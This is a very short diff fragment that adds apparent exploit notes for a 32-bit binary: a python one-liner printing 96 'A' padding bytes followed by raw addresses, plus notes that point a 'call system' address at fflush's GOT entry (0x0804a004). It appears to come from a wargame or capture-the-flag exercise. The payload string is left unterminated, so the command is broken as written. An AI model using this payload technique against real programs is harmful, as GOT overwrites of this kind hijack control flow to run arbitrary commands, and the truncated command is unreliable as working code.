@@ -1,0 +1,4 @@
+python -c "print('A' * 96 + '\x04\xa0\x04\x08
+call system \x08\x04\x85\xe3
+
+fflush got 0804a004
